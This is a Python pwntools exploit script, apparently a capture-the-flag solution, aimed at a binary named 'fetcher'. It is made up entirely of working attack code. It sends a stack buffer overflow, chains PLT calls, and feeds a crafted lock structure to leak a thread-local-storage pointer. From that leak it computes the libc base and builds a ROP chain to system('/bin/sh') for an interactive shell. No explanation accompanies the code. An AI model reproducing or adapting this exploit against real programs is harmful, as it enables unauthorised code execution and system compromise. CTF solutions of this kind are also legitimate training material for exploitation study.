#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or 'fetcher')
libc=ELF("libc.so.6")
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def logleak(name: str, addr: int): print(f"[*] %s => %#lx" % (name, addr))

io = start()

sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
s = lambda a: io.send(a)
rlu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
itb = lambda a: str(a).encode()

off = 40

payload = b""
payload = payload.ljust(40, b'\x00')
payload += flat(exe.plt.gets)
payload += flat(exe.plt.gets)
payload += flat(exe.plt.puts)
payload += flat(exe.sym.main)

sl(payload)

sl( p32(0) # int _lock
    + b'AAAA' # int cnt
    + b'B' * 8 # void *owner (!= NULL)
    )

sl(b'CCCC') # garbage to reach to THREAD_SAFE

rl()

tls = u64(rl().split(b'CCCC')[1].split(b'AA')[1].rstrip(b'\n').ljust(8, b'\x00'))
libc.address = tls + 0x3000 - 0x740

logleak("tls", tls)
logleak("libc", libc.address)

gadgets = ROP(libc)

rop = b'A' * off
rop += flat(gadgets.rdi.address) + flat(next(libc.search(b"/bin/sh\x00")))
rop += flat(gadgets.ret.address) + flat(libc.sym.system)

sl(rop)

io.interactive()

